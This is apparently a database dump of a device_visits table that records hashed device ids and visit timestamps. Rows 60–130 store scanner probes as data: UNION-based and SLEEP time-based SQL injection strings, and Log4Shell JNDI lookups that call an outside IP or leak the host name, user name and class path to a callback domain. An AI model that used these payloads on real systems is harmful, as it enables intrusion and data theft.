INSERT INTO device_visits VALUES(50,'1176c109','2026-03-18','2026-03-18 17:11:33');
INSERT INTO device_visits VALUES(51,'7ebc752','2026-03-18','2026-03-18 17:30:10');
INSERT INTO device_visits VALUES(52,'47ae25b5','2026-03-18','2026-03-18 20:25:47');
INSERT INTO device_visits VALUES(53,'259217a5','2026-03-18','2026-03-18 22:57:17');
INSERT INTO device_visits VALUES(54,'5fe08a5f','2026-03-19','2026-03-19 01:11:04');
INSERT INTO device_visits VALUES(55,'41d4e68f','2026-03-19','2026-03-19 01:11:04');
INSERT INTO device_visits VALUES(56,'79b4031','2026-03-19','2026-03-19 01:11:04');
INSERT INTO device_visits VALUES(57,'349e11d2','2026-03-19','2026-03-19 01:11:13');
INSERT INTO device_visits VALUES(58,'4c9c30b9','2026-03-19','2026-03-19 01:11:46');
INSERT INTO device_visits VALUES(59,'2f0027e7','2026-03-19','2026-03-19 01:12:15');
INSERT INTO device_visits VALUES(60,''' union select 1-- ','2026-03-19','2026-03-19 01:14:04');
INSERT INTO device_visits VALUES(61,''' union select 1,2-- ','2026-03-19','2026-03-19 01:14:04');
INSERT INTO device_visits VALUES(62,''' union select 1,2,3-- ','2026-03-19','2026-03-19 01:14:04');
INSERT INTO device_visits VALUES(63,''' union select 1,2,3,4-- ','2026-03-19','2026-03-19 01:14:04');
INSERT INTO device_visits VALUES(64,'5fe08a5f'')) OR (SELECT*FROM(SELECT(SLEEP(4)))sutp) limit 1#','2026-03-19','2026-03-19 01:14:04');
INSERT INTO device_visits VALUES(65,''')) OR (SELECT*FROM(SELECT(SLEEP(4)))qpuy) limit 1#','2026-03-19','2026-03-19 01:14:04');
INSERT INTO device_visits VALUES(66,'") OR (SELECT*FROM(SELECT(SLEEP(3)))nphd) limit 1#','2026-03-19','2026-03-19 01:14:05');
INSERT INTO device_visits VALUES(67,'5fe08a5f" union select 1-- ','2026-03-19','2026-03-19 01:14:05');
INSERT INTO device_visits VALUES(68,'5fe08a5f" union select 1,2-- ','2026-03-19','2026-03-19 01:14:05');
INSERT INTO device_visits VALUES(69,'5fe08a5f" union select 1,2,3-- ','2026-03-19','2026-03-19 01:14:05');
INSERT INTO device_visits VALUES(70,'5fe08a5f" union select 1,2,3,4-- ','2026-03-19','2026-03-19 01:14:05');
INSERT INTO device_visits VALUES(71,'5fe08a5f'' OR (SELECT*FROM(SELECT(SLEEP(3)))jnuw) limit 1#','2026-03-19','2026-03-19 01:14:05');
INSERT INTO device_visits VALUES(72,''' OR (SELECT*FROM(SELECT(SLEEP(3)))eets) limit 1#','2026-03-19','2026-03-19 01:14:05');
INSERT INTO device_visits VALUES(73,'5fe08a5f") OR (SELECT*FROM(SELECT(SLEEP(3)))nphd) limit 1#','2026-03-19','2026-03-19 01:14:06');
INSERT INTO device_visits VALUES(74,'")) OR (SELECT*FROM(SELECT(SLEEP(3)))nphd) limit 1#','2026-03-19','2026-03-19 01:14:06');
INSERT INTO device_visits VALUES(75,'5fe08a5f'' union select 1-- ','2026-03-19','2026-03-19 01:14:06');
INSERT INTO device_visits VALUES(76,'5fe08a5f'' union select 1,2-- ','2026-03-19','2026-03-19 01:14:06');
INSERT INTO device_visits VALUES(77,'5fe08a5f'' union select 1,2,3-- ','2026-03-19','2026-03-19 01:14:06');
INSERT INTO device_visits VALUES(78,'5fe08a5f'' union select 1,2,3,4-- ','2026-03-19','2026-03-19 01:14:06');
INSERT INTO device_visits VALUES(79,'5fe08a5f'' union select 1,2,3,4,5-- ','2026-03-19','2026-03-19 01:14:06');
INSERT INTO device_visits VALUES(80,'5fe08a5f'') OR (SELECT*FROM(SELECT(SLEEP(2)))qjli) limit 1#','2026-03-19','2026-03-19 01:14:06');
INSERT INTO device_visits VALUES(81,'5fe08a5f")) OR (SELECT*FROM(SELECT(SLEEP(3)))nphd) limit 1#','2026-03-19','2026-03-19 01:14:07');
INSERT INTO device_visits VALUES(82,'5fe08a5f" OR (SELECT*FROM(SELECT(SLEEP(3)))nphd) limit 1#','2026-03-19','2026-03-19 01:14:07');
INSERT INTO device_visits VALUES(83,''') OR (SELECT*FROM(SELECT(SLEEP(2)))fmnq) limit 1#','2026-03-19','2026-03-19 01:14:07');
INSERT INTO device_visits VALUES(84,'5fe08a5f")) AND (SELECT*FROM(SELECT(SLEEP(3)))bqtx) limit 1#','2026-03-19','2026-03-19 01:14:07');
INSERT INTO device_visits VALUES(85,'")) AND (SELECT*FROM(SELECT(SLEEP(3)))hvxk) limit 1#','2026-03-19','2026-03-19 01:14:07');
INSERT INTO device_visits VALUES(86,'5fe08a5f" AND (SELECT*FROM(SELECT(SLEEP(3)))fnrv) limit 1#','2026-03-19','2026-03-19 01:14:07');
INSERT INTO device_visits VALUES(87,'" AND (SELECT*FROM(SELECT(SLEEP(4)))tyif) limit 1#','2026-03-19','2026-03-19 01:14:07');
INSERT INTO device_visits VALUES(88,'" union select 1-- ','2026-03-19','2026-03-19 01:14:08');
INSERT INTO device_visits VALUES(89,'" union select 1,2-- ','2026-03-19','2026-03-19 01:14:08');
INSERT INTO device_visits VALUES(90,'" union select 1,2,3-- ','2026-03-19','2026-03-19 01:14:08');
INSERT INTO device_visits VALUES(91,'" union select 1,2,3,4-- ','2026-03-19','2026-03-19 01:14:08');
INSERT INTO device_visits VALUES(92,'" union select 1,2,3,4,5-- ','2026-03-19','2026-03-19 01:14:08');
INSERT INTO device_visits VALUES(93,'5fe08a5f'')) AND (SELECT*FROM(SELECT(SLEEP(3)))ezlf) limit 1#','2026-03-19','2026-03-19 01:14:09');
INSERT INTO device_visits VALUES(94,''')) AND (SELECT*FROM(SELECT(SLEEP(4)))uwut) limit 1#','2026-03-19','2026-03-19 01:14:09');
INSERT INTO device_visits VALUES(95,'" OR (SELECT*FROM(SELECT(SLEEP(3)))nphd) limit 1#','2026-03-19','2026-03-19 01:14:09');
INSERT INTO device_visits VALUES(96,'5fe08a5f" union select 1,2,3,4,5-- ','2026-03-19','2026-03-19 01:14:09');
INSERT INTO device_visits VALUES(97,'5fe08a5f" union select 1,2,3,4,5,6-- ','2026-03-19','2026-03-19 01:14:09');
INSERT INTO device_visits VALUES(98,'5fe08a5f") AND (SELECT*FROM(SELECT(SLEEP(3)))cerz) limit 1#','2026-03-19','2026-03-19 01:14:10');
INSERT INTO device_visits VALUES(99,'") AND (SELECT*FROM(SELECT(SLEEP(4)))ravj) limit 1#','2026-03-19','2026-03-19 01:14:10');
INSERT INTO device_visits VALUES(100,''' union select 1,2,3,4,5-- ','2026-03-19','2026-03-19 01:14:10');
INSERT INTO device_visits VALUES(101,''' union select 1,2,3,4,5,6-- ','2026-03-19','2026-03-19 01:14:10');
INSERT INTO device_visits VALUES(102,''' union select 1,2,3,4,5,6,7-- ','2026-03-19','2026-03-19 01:14:10');
INSERT INTO device_visits VALUES(103,''' union select 1,2,3,4,5,6,7,8-- ','2026-03-19','2026-03-19 01:14:10');
INSERT INTO device_visits VALUES(104,'5fe08a5f'' AND (SELECT*FROM(SELECT(SLEEP(3)))zhxe) limit 1#','2026-03-19','2026-03-19 01:14:11');
INSERT INTO device_visits VALUES(105,'5fe08a5f'' union select 1,2,3,4,5,6-- ','2026-03-19','2026-03-19 01:14:11');
INSERT INTO device_visits VALUES(106,'5fe08a5f'' union select 1,2,3,4,5,6,7-- ','2026-03-19','2026-03-19 01:14:11');
INSERT INTO device_visits VALUES(107,'5fe08a5f'' union select 1,2,3,4,5,6,7,8-- ','2026-03-19','2026-03-19 01:14:11');
INSERT INTO device_visits VALUES(108,'5fe08a5f'' union select 1,2,3,4,5,6,7,8,9-- ','2026-03-19','2026-03-19 01:14:11');
INSERT INTO device_visits VALUES(109,'5fe08a5f'' union select 1,2,3,4,5,6,7,8,9,10-- ','2026-03-19','2026-03-19 01:14:11');
INSERT INTO device_visits VALUES(110,'5fe08a5f" union select 1,2,3,4,5,6,7-- ','2026-03-19','2026-03-19 01:14:11');
INSERT INTO device_visits VALUES(111,'" union select 1,2,3,4,5,6-- ','2026-03-19','2026-03-19 01:14:12');
INSERT INTO device_visits VALUES(112,'" union select 1,2,3,4,5,6,7-- ','2026-03-19','2026-03-19 01:14:12');
INSERT INTO device_visits VALUES(113,'" union select 1,2,3,4,5,6,7,8-- ','2026-03-19','2026-03-19 01:14:12');
INSERT INTO device_visits VALUES(114,''' AND (SELECT*FROM(SELECT(SLEEP(3)))yshd) limit 1#','2026-03-19','2026-03-19 01:14:13');
INSERT INTO device_visits VALUES(115,'5fe08a5f'') AND (SELECT*FROM(SELECT(SLEEP(2)))idea) limit 1#','2026-03-19','2026-03-19 01:14:13');
INSERT INTO device_visits VALUES(116,''') AND (SELECT*FROM(SELECT(SLEEP(2)))zzky) limit 1#','2026-03-19','2026-03-19 01:14:13');
INSERT INTO device_visits VALUES(117,'5fe08a5f AND (SELECT*FROM(SELECT(SLEEP(2)))klis) limit 1#','2026-03-19','2026-03-19 01:14:13');
INSERT INTO device_visits VALUES(118,' AND (SELECT*FROM(SELECT(SLEEP(3)))kkyl) limit 1#','2026-03-19','2026-03-19 01:14:14');
INSERT INTO device_visits VALUES(119,''' union select 1,2,3,4,5,6,7,8,9-- ','2026-03-19','2026-03-19 01:14:14');
INSERT INTO device_visits VALUES(120,''' union select 1,2,3,4,5,6,7,8,9,10-- ','2026-03-19','2026-03-19 01:14:14');
INSERT INTO device_visits VALUES(121,'${jndi:rmi://183.47.120.213:1099/bypassdb631d18ab45bf3838d10a040cdcc744-/-${hostName}}','2026-03-19','2026-03-19 01:14:14');
INSERT INTO device_visits VALUES(122,'${jndi:ldap://183.47.120.213:1389/jdk18e87a34e652416181d05f80e7053fe704-/-${hostName}}','2026-03-19','2026-03-19 01:14:14');
INSERT INTO device_visits VALUES(123,'5fe08a5f" union select 1,2,3,4,5,6,7,8-- ','2026-03-19','2026-03-19 01:14:15');
INSERT INTO device_visits VALUES(124,'5fe08a5f" union select 1,2,3,4,5,6,7,8,9-- ','2026-03-19','2026-03-19 01:14:15');
INSERT INTO device_visits VALUES(125,'5fe08a5f" union select 1,2,3,4,5,6,7,8,9,10-- ','2026-03-19','2026-03-19 01:14:15');
INSERT INTO device_visits VALUES(126,'${jndi:ldap://hostname-${hostName}.username-${sys:user.name}.javapath-${sys:java.class.path}.b8bc7d3f5c6d09b3a40325e8863efb60.4j2.mauu.mauu.me/}','2026-03-19','2026-03-19 01:14:15');
INSERT INTO device_visits VALUES(127,'" union select 1,2,3,4,5,6,7,8,9-- ','2026-03-19','2026-03-19 01:14:15');
INSERT INTO device_visits VALUES(128,'" union select 1,2,3,4,5,6,7,8,9,10-- ','2026-03-19','2026-03-19 01:14:15');
INSERT INTO device_visits VALUES(129,'${jndi:rmi://hostname-${hostName}.username-${sys:user.name}.javapath-${sys:java.class.path}.2a72ded79597d746c71f48a15373dcb7.4j2.mauu.mauu.me/}','2026-03-19','2026-03-19 01:14:15');
INSERT INTO device_visits VALUES(130,'aaaa''%bf%27','2026-03-19','2026-03-19 01:14:16');
INSERT INTO device_visits VALUES(131,'68421d66','2026-03-19','2026-03-19 02:59:30');
INSERT INTO device_visits VALUES(132,'2cf6a765','2026-03-19','2026-03-19 03:07:29');
INSERT INTO device_visits VALUES(133,'3e1cd851','2026-03-19','2026-03-19 08:24:24');
INSERT INTO device_visits VALUES(134,'7ca394d1','2026-03-19','2026-03-19 09:02:12');
INSERT INTO device_visits VALUES(135,'40e4301','2026-03-19','2026-03-19 09:34:40');
INSERT INTO device_visits VALUES(136,'3995510e','2026-03-19','2026-03-19 13:00:41');
INSERT INTO device_visits VALUES(137,'4f2cc3f0','2026-03-19','2026-03-19 16:02:34');
INSERT INTO device_visits VALUES(138,'1cef1537','2026-03-19','2026-03-19 17:53:45');
INSERT INTO device_visits VALUES(139,'77b77e49','2026-03-19','2026-03-19 22:18:45');
INSERT INTO device_visits VALUES(140,'68421d66','2026-03-20','2026-03-20 00:51:24');
INSERT INTO device_visits VALUES(141,'39ea2e5a','2026-03-20','2026-03-20 02:16:15');
INSERT INTO device_visits VALUES(142,'1bd59f20','2026-03-20','2026-03-20 02:16:16');
INSERT INTO device_visits VALUES(143,'64ab8343','2026-03-20','2026-03-20 02:16:16');
INSERT INTO device_visits VALUES(144,'60c93c21','2026-03-20','2026-03-20 02:16:23');
INSERT INTO device_visits VALUES(145,'5f1fac4','2026-03-20','2026-03-20 02:29:28');
INSERT INTO device_visits VALUES(146,'76c3fe0f','2026-03-20','2026-03-20 04:26:32');
INSERT INTO device_visits VALUES(147,'683f5796','2026-03-20','2026-03-20 05:03:24');
INSERT INTO device_visits VALUES(148,'7a67e4c7','2026-03-20','2026-03-20 06:00:19');
INSERT INTO device_visits VALUES(149,'6992f616','2026-03-20','2026-03-20 06:30:24');
INSERT INTO device_visits VALUES(150,'773f0eb7','2026-03-20','2026-03-20 07:03:25');
INSERT INTO device_visits VALUES(151,'232cd23','2026-03-20','2026-03-20 08:23:53');
INSERT INTO device_visits VALUES(152,'6c614c6b','2026-03-20','2026-03-20 11:18:38');
INSERT INTO device_visits VALUES(153,'46c40931','2026-03-20','2026-03-20 13:36:12');
INSERT INTO device_visits VALUES(154,'4c9c30b9','2026-03-20','2026-03-20 14:58:30');
INSERT INTO device_visits VALUES(155,'7f5aa221','2026-03-20','2026-03-20 14:58:48');
INSERT INTO device_visits VALUES(156,'6bbdc510','2026-03-20','2026-03-20 15:01:00');
INSERT INTO device_visits VALUES(157,'2b0f9ee2','2026-03-20','2026-03-20 16:16:36');
INSERT INTO device_visits VALUES(158,'9cbab96','2026-03-20','2026-03-20 17:10:26');
INSERT INTO device_visits VALUES(159,'33785a40','2026-03-20','2026-03-20 17:10:36');
INSERT INTO device_visits VALUES(160,'72a12416','2026-03-20','2026-03-20 17:12:32');
INSERT INTO device_visits VALUES(161,'63efcd74','2026-03-20','2026-03-20 17:51:25');
INSERT INTO device_visits VALUES(162,'63f5a8c8','2026-03-20','2026-03-20 18:45:06');
INSERT INTO device_visits VALUES(163,'65e037f2','2026-03-20','2026-03-20 18:45:12');
INSERT INTO device_visits VALUES(164,'29d1659c','2026-03-20','2026-03-20 18:46:07');
INSERT INTO device_visits VALUES(165,'639a7c3e','2026-03-20','2026-03-20 18:46:13');
INSERT INTO device_visits VALUES(166,'7d649739','2026-03-20','2026-03-20 18:46:28');
INSERT INTO device_visits VALUES(167,'2193b4b4','2026-03-20','2026-03-20 18:46:33');
INSERT INTO device_visits VALUES(168,'4bdf768','2026-03-20','2026-03-20 18:57:21');
INSERT INTO device_visits VALUES(169,'332fe987','2026-03-20','2026-03-20 18:57:29');
INSERT INTO device_visits VALUES(170,'575cb7f6','2026-03-20','2026-03-20 18:57:31');
INSERT INTO device_visits VALUES(171,'43069823','2026-03-20','2026-03-20 18:57:39');
INSERT INTO device_visits VALUES(172,'1da5bdbb','2026-03-20','2026-03-20 19:34:21');
INSERT INTO device_visits VALUES(173,'35121641','2026-03-20','2026-03-20 19:45:47');
INSERT INTO device_visits VALUES(174,'30d0e137','2026-03-20','2026-03-20 19:45:52');
INSERT INTO device_visits VALUES(175,'5641d57b','2026-03-20','2026-03-20 19:46:11');
INSERT INTO device_visits VALUES(176,'4a34f47d','2026-03-20','2026-03-20 22:34:08');
INSERT INTO device_visits VALUES(177,'7ce8d9df','2026-03-21','2026-03-21 00:05:03');
INSERT INTO device_visits VALUES(178,'4c9c30b9','2026-03-21','2026-03-21 00:36:08');
INSERT INTO device_visits VALUES(179,'7f5aa221','2026-03-21','2026-03-21 00:41:09');
INSERT INTO device_visits VALUES(180,'2f0027e7','2026-03-21','2026-03-21 00:58:12');
INSERT INTO device_visits VALUES(181,'5f68de17','2026-03-21','2026-03-21 00:58:58');
INSERT INTO device_visits VALUES(182,'396f1ced','2026-03-21','2026-03-21 02:32:57');
INSERT INTO device_visits VALUES(183,'139c09c0','2026-03-21','2026-03-21 03:59:35');
INSERT INTO device_visits VALUES(184,'76b3db44','2026-03-21','2026-03-21 06:43:53');
INSERT INTO device_visits VALUES(185,'75ee6daa','2026-03-21','2026-03-21 07:43:25');
INSERT INTO device_visits VALUES(186,'1bbb4202','2026-03-21','2026-03-21 07:43:33');
INSERT INTO device_visits VALUES(187,'5e869cc0','2026-03-21','2026-03-21 08:24:24');
INSERT INTO device_visits VALUES(188,'496ae707','2026-03-21','2026-03-21 08:34:19');
INSERT INTO device_visits VALUES(189,'9cbab96','2026-03-21','2026-03-21 08:47:02');
INSERT INTO device_visits VALUES(190,'7b07ece9','2026-03-21','2026-03-21 08:52:46');
INSERT INTO device_visits VALUES(191,'549b1463','2026-03-21','2026-03-21 08:54:51');
INSERT INTO device_visits VALUES(192,'209bbe89','2026-03-21','2026-03-21 09:36:11');
INSERT INTO device_visits VALUES(193,'1710293f','2026-03-21','2026-03-21 10:01:28');
INSERT INTO device_visits VALUES(194,'18aa79dd','2026-03-21','2026-03-21 13:02:31');
INSERT INTO device_visits VALUES(195,'4a2028d9','2026-03-21','2026-03-21 13:03:23');
INSERT INTO device_visits VALUES(196,'488f8a57','2026-03-21','2026-03-21 13:21:10');
INSERT INTO device_visits VALUES(197,'7d790be8','2026-03-21','2026-03-21 13:26:07');
INSERT INTO device_visits VALUES(198,'4c0a566','2026-03-21','2026-03-21 13:26:18');
INSERT INTO device_visits VALUES(199,'47b65341','2026-03-21','2026-03-21 14:08:50');
INSERT INTO device_visits VALUES(200,'25b7507','2026-03-21','2026-03-21 18:07:31');
INSERT INTO device_visits VALUES(201,'4acb37a0','2026-03-21','2026-03-21 19:15:37');
INSERT INTO device_visits VALUES(202,'4c9c30b9','2026-03-22','2026-03-22 01:10:50');
INSERT INTO device_visits VALUES(203,'6224b867','2026-03-22','2026-03-22 01:12:57');
INSERT INTO device_visits VALUES(204,'77d9eabe','2026-03-22','2026-03-22 01:17:36');
INSERT INTO device_visits VALUES(205,'5bea5e03','2026-03-22','2026-03-22 01:37:20');
INSERT INTO device_visits VALUES(206,'446b5bd2','2026-03-22','2026-03-22 02:18:01');
INSERT INTO device_visits VALUES(207,'9cbab96','2026-03-22','2026-03-22 02:18:48');
INSERT INTO device_visits VALUES(208,'5f68de17','2026-03-22','2026-03-22 02:54:06');
INSERT INTO device_visits VALUES(209,'1d20a543','2026-03-22','2026-03-22 06:14:11');
INSERT INTO device_visits VALUES(210,'7b07ece9','2026-03-22','2026-03-22 09:13:08');
INSERT INTO device_visits VALUES(211,'befa8f2','2026-03-22','2026-03-22 09:14:03');
INSERT INTO device_visits VALUES(212,'74e63dfb','2026-03-22','2026-03-22 10:45:59');
INSERT INTO device_visits VALUES(213,'7f5aa221','2026-03-22','2026-03-22 12:31:11');
INSERT INTO device_visits VALUES(214,'23397208','2026-03-22','2026-03-22 14:39:01');
INSERT INTO device_visits VALUES(215,'39983e44','2026-03-22','2026-03-22 14:41:13');
INSERT INTO device_visits VALUES(216,'d9921c7','2026-03-22','2026-03-22 14:41:50');
INSERT INTO device_visits VALUES(217,'26938cb8','2026-03-22','2026-03-22 14:43:17');
INSERT INTO device_visits VALUES(218,'2e854981','2026-03-22','2026-03-22 14:44:59');
INSERT INTO device_visits VALUES(219,'1aa5a8c6','2026-03-22','2026-03-22 16:16:35');
INSERT INTO device_visits VALUES(220,'31ed39c1','2026-03-22','2026-03-22 16:16:48');
INSERT INTO device_visits VALUES(221,'68f447af','2026-03-22','2026-03-22 17:25:25');
INSERT INTO device_visits VALUES(222,'4629ce8c','2026-03-22','2026-03-22 17:40:32');
INSERT INTO device_visits VALUES(223,'2699cee','2026-03-22','2026-03-22 17:51:15');
INSERT INTO device_visits VALUES(224,'18a5a7fc','2026-03-22','2026-03-22 18:28:54');
INSERT INTO device_visits VALUES(225,'20fc827c','2026-03-22','2026-03-22 20:15:06');
INSERT INTO device_visits VALUES(226,'2990338f','2026-03-22','2026-03-22 23:52:11');
INSERT INTO device_visits VALUES(227,'4ff5d623','2026-03-22','2026-03-22 23:52:29');
INSERT INTO device_visits VALUES(228,'1759a9d6','2026-03-22','2026-03-22 23:53:02');
INSERT INTO device_visits VALUES(229,'9cbab96','2026-03-23','2026-03-23 00:01:44');
INSERT INTO device_visits VALUES(230,'4123450','2026-03-23','2026-03-23 00:01:56');
INSERT INTO device_visits VALUES(231,'30c13f79','2026-03-23','2026-03-23 00:02:25');
INSERT INTO device_visits VALUES(232,'2990338f','2026-03-23','2026-03-23 00:05:08');
INSERT INTO device_visits VALUES(233,'7f5aa221','2026-03-23','2026-03-23 00:05:29');
INSERT INTO device_visits VALUES(234,'cf78985','2026-03-23','2026-03-23 00:15:28');
INSERT INTO device_visits VALUES(235,'4c9c30b9','2026-03-23','2026-03-23 00:18:15');
INSERT INTO device_visits VALUES(236,'5f68de17','2026-03-23','2026-03-23 00:20:44');
INSERT INTO device_visits VALUES(237,'18a5a7fc','2026-03-23','2026-03-23 00:25:10');
INSERT INTO device_visits VALUES(238,'16ad5291','2026-03-23','2026-03-23 00:32:45');
INSERT INTO device_visits VALUES(239,'59e95694','2026-03-23','2026-03-23 00:44:53');
INSERT INTO device_visits VALUES(240,'1e21e70a','2026-03-23','2026-03-23 00:52:22');
INSERT INTO device_visits VALUES(241,'5268ff50','2026-03-23','2026-03-23 01:32:12');
INSERT INTO device_visits VALUES(242,'42ffaa16','2026-03-23','2026-03-23 01:52:54');
INSERT INTO device_visits VALUES(243,'74e63dfb','2026-03-23','2026-03-23 02:53:35');
INSERT INTO device_visits VALUES(244,'442d447','2026-03-23','2026-03-23 05:03:41');
INSERT INTO device_visits VALUES(245,'560a3d43','2026-03-23','2026-03-23 05:04:00');
INSERT INTO device_visits VALUES(246,'568661d9','2026-03-23','2026-03-23 05:04:01');
INSERT INTO device_visits VALUES(247,'67e8b2a6','2026-03-23','2026-03-23 05:18:46');
INSERT INTO device_visits VALUES(248,'256bca5f','2026-03-23','2026-03-23 05:20:47');
INSERT INTO device_visits VALUES(249,'5b076700','2026-03-23','2026-03-23 07:28:18');
INSERT INTO device_visits VALUES(250,'70696569','2026-03-23','2026-03-23 07:29:44');
INSERT INTO device_visits VALUES(251,'2935b5a9','2026-03-23','2026-03-23 07:31:24');
INSERT INTO device_visits VALUES(252,'28137ddf','2026-03-23','2026-03-23 08:20:19');
INSERT INTO device_visits VALUES(253,'101daa20','2026-03-23','2026-03-23 08:24:47');
INSERT INTO device_visits VALUES(254,'282b6c18','2026-03-23','2026-03-23 08:25:29');
INSERT INTO device_visits VALUES(255,'1e5e6412','2026-03-23','2026-03-23 08:25:34');
INSERT INTO device_visits VALUES(256,'4fe994f','2026-03-23','2026-03-23 08:32:34');
INSERT INTO device_visits VALUES(257,'49aa4bbb','2026-03-23','2026-03-23 08:34:35');
INSERT INTO device_visits VALUES(258,'211b9aef','2026-03-23','2026-03-23 08:43:18');
INSERT INTO device_visits VALUES(259,'9d26e1a','2026-03-23','2026-03-23 09:20:38');
INSERT INTO device_visits VALUES(260,'4e38748f','2026-03-23','2026-03-23 12:15:40');
INSERT INTO device_visits VALUES(261,'1290b5a9','2026-03-23','2026-03-23 13:02:16');
INSERT INTO device_visits VALUES(262,'7c7bd897','2026-03-23','2026-03-23 13:07:09');
INSERT INTO device_visits VALUES(263,'65cb8217','2026-03-23','2026-03-23 15:17:11');
INSERT INTO device_visits VALUES(264,'3112af03','2026-03-23','2026-03-23 15:42:06');
INSERT INTO device_visits VALUES(265,'2ccd41da','2026-03-23','2026-03-23 16:32:35');
INSERT INTO device_visits VALUES(266,'67cebd9e','2026-03-23','2026-03-23 19:27:29');
INSERT INTO device_visits VALUES(267,'720fbace','2026-03-23','2026-03-23 22:24:39');
INSERT INTO device_visits VALUES(268,'518e8265','2026-03-23','2026-03-23 23:26:00');
INSERT INTO device_visits VALUES(269,'371ea751','2026-03-23','2026-03-23 23:26:01');
INSERT INTO device_visits VALUES(270,'4c9c30b9','2026-03-24','2026-03-24 00:07:47');
INSERT INTO device_visits VALUES(271,'3112af03','2026-03-24','2026-03-24 00:48:15');
INSERT INTO device_visits VALUES(272,'1442f5f8','2026-03-24','2026-03-24 01:18:57');
INSERT INTO device_visits VALUES(273,'7fdf6fbb','2026-03-24','2026-03-24 01:46:20');
INSERT INTO device_visits VALUES(274,'1d20a543','2026-03-24','2026-03-24 01:47:49');
INSERT INTO device_visits VALUES(275,'7ae7287e','2026-03-24','2026-03-24 01:53:18');
INSERT INTO device_visits VALUES(276,'6086157b','2026-03-24','2026-03-24 02:34:46');
INSERT INTO device_visits VALUES(277,'2364b6a1','2026-03-24','2026-03-24 05:54:43');
INSERT INTO device_visits VALUES(278,'2f1a1992','2026-03-24','2026-03-24 08:31:50');
INSERT INTO device_visits VALUES(279,'8271a7e','2026-03-24','2026-03-24 08:51:57');
INSERT INTO device_visits VALUES(280,'3aa6b474','2026-03-24','2026-03-24 10:24:49');
INSERT INTO device_visits VALUES(281,'41071d40','2026-03-24','2026-03-24 10:25:14');
INSERT INTO device_visits VALUES(282,'57a78856','2026-03-24','2026-03-24 10:27:06');
INSERT INTO device_visits VALUES(283,'618ce1b2','2026-03-24','2026-03-24 10:28:34');
INSERT INTO device_visits VALUES(284,'246184e9','2026-03-24','2026-03-24 10:34:25');
INSERT INTO device_visits VALUES(285,'7a67e4c7','2026-03-24','2026-03-24 10:44:03');
INSERT INTO device_visits VALUES(286,'50bdcf6d','2026-03-24','2026-03-24 10:49:37');
INSERT INTO device_visits VALUES(287,'8ca2b8a','2026-03-24','2026-03-24 12:10:51');
INSERT INTO device_visits VALUES(288,'4af63921','2026-03-24','2026-03-24 13:32:45');
INSERT INTO device_visits VALUES(289,'1d2c9ff3','2026-03-24','2026-03-24 16:34:19');
INSERT INTO device_visits VALUES(290,'2c7659eb','2026-03-24','2026-03-24 20:06:15');
INSERT INTO device_visits VALUES(291,'4d7e27ba','2026-03-24','2026-03-24 21:12:22');
INSERT INTO device_visits VALUES(292,'205019a0','2026-03-24','2026-03-24 21:13:28');
INSERT INTO device_visits VALUES(293,'79793910','2026-03-24','2026-03-24 21:13:43');
INSERT INTO device_visits VALUES(294,'35cbc66b','2026-03-24','2026-03-24 21:13:50');
INSERT INTO device_visits VALUES(295,'5c7eae76','2026-03-24','2026-03-24 21:14:10');
INSERT INTO device_visits VALUES(296,'5ecbab2c','2026-03-24','2026-03-24 21:14:29');
INSERT INTO device_visits VALUES(297,'54da04bd','2026-03-24','2026-03-24 23:43:39');
INSERT INTO device_visits VALUES(298,'58ae40b2','2026-03-25','2026-03-25 00:08:07');
INSERT INTO device_visits VALUES(299,'4c9c30b9','2026-03-25','2026-03-25 02:01:31');
INSERT INTO device_visits VALUES(300,'5f68de17','2026-03-25','2026-03-25 05:28:58');
INSERT INTO device_visits VALUES(301,'892265','2026-03-25','2026-03-25 06:44:10');
INSERT INTO device_visits VALUES(302,'befa8f2','2026-03-25','2026-03-25 06:53:27');
INSERT INTO device_visits VALUES(303,'569c97a4','2026-03-25','2026-03-25 06:56:30');
INSERT INTO device_visits VALUES(304,'4dd3d1b2','2026-03-25','2026-03-25 06:56:33');
INSERT INTO device_visits VALUES(305,'76c578cc','2026-03-25','2026-03-25 06:56:55');
INSERT INTO device_visits VALUES(306,'9907da5','2026-03-25','2026-03-25 08:58:53');
INSERT INTO device_visits VALUES(307,'2d2effd6','2026-03-25','2026-03-25 14:52:42');
INSERT INTO device_visits VALUES(308,'754e31e8','2026-03-25','2026-03-25 14:53:11');
INSERT INTO device_visits VALUES(309,'600f8455','2026-03-25','2026-03-25 14:53:41');
INSERT INTO device_visits VALUES(310,'ad8b6d2','2026-03-25','2026-03-25 14:53:46');
INSERT INTO device_visits VALUES(311,'2f93b224','2026-03-25','2026-03-25 14:54:11');
INSERT INTO device_visits VALUES(312,'7c81bb1d','2026-03-25','2026-03-25 14:54:49');
INSERT INTO device_visits VALUES(313,'3970fd4b','2026-03-25','2026-03-25 14:55:01');
INSERT INTO device_visits VALUES(314,'469f2ec9','2026-03-25','2026-03-25 14:55:52');
INSERT INTO device_visits VALUES(315,'12f8e26d','2026-03-25','2026-03-25 14:56:08');
INSERT INTO device_visits VALUES(316,'11ac68b9','2026-03-25','2026-03-25 14:56:52');
INSERT INTO device_visits VALUES(317,'7b3693b0','2026-03-25','2026-03-25 14:57:03');
INSERT INTO device_visits VALUES(318,'46e0ba70','2026-03-25','2026-03-25 14:57:11');
INSERT INTO device_visits VALUES(319,'51526c47','2026-03-25','2026-03-25 14:57:22');
INSERT INTO device_visits VALUES(320,'7fe8bebd','2026-03-25','2026-03-25 14:57:36');
INSERT INTO device_visits VALUES(321,'8aea666','2026-03-25','2026-03-25 14:57:41');
INSERT INTO device_visits VALUES(322,'7e63b218','2026-03-25','2026-03-25 14:58:48');
INSERT INTO device_visits VALUES(323,'6f88616','2026-03-25','2026-03-25 14:58:49');
INSERT INTO device_visits VALUES(324,'241b832c','2026-03-25','2026-03-25 14:59:19');
INSERT INTO device_visits VALUES(325,'39a9bb4c','2026-03-25','2026-03-25 14:59:33');
INSERT INTO device_visits VALUES(326,'2897984d','2026-03-25','2026-03-25 15:02:46');
INSERT INTO device_visits VALUES(327,'12d2c364','2026-03-25','2026-03-25 15:07:11');
INSERT INTO device_visits VALUES(328,'1724ea26','2026-03-25','2026-03-25 15:11:52');
INSERT INTO device_visits VALUES(329,'611eec5c','2026-03-25','2026-03-25 15:14:50');
INSERT INTO device_visits VALUES(330,'32425ad1','2026-03-25','2026-03-25 15:15:11');
INSERT INTO device_visits VALUES(331,'7b07ece9','2026-03-25','2026-03-25 15:25:56');
INSERT INTO device_visits VALUES(332,'35e32ac7','2026-03-25','2026-03-25 15:25:59');
INSERT INTO device_visits VALUES(333,'654e9c88','2026-03-25','2026-03-25 15:27:37');
INSERT INTO device_visits VALUES(334,'42be7e06','2026-03-25','2026-03-25 15:28:57');
